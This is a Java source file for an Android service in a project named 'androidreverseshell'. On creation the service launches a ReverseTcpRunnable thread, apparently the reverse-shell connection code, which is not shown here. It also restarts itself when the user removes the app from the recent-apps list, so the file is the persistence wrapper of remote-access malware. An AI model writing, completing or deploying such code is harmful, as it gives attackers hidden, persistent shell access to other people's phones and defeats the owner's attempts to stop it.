package com.anythingintellect.androidreverseshell;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class ReverseTcpService extends Service {
    Intent startIntent = null;
    public ReverseTcpService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not Supported");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(startIntent == null) {
            startIntent = intent;
        }
        return super.onStartCommand(intent, flags, startId);
    }


    @Override
    public void onCreate() {
        super.onCreate();
        Thread thread = new Thread(new ReverseTcpRunnable());
        thread.start();
    }

    // If user removes the task, we will initialize
    // One of the case is App removal from Recent App list ~ Applicable when we have Activity
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        startService(startIntent);
    }



}
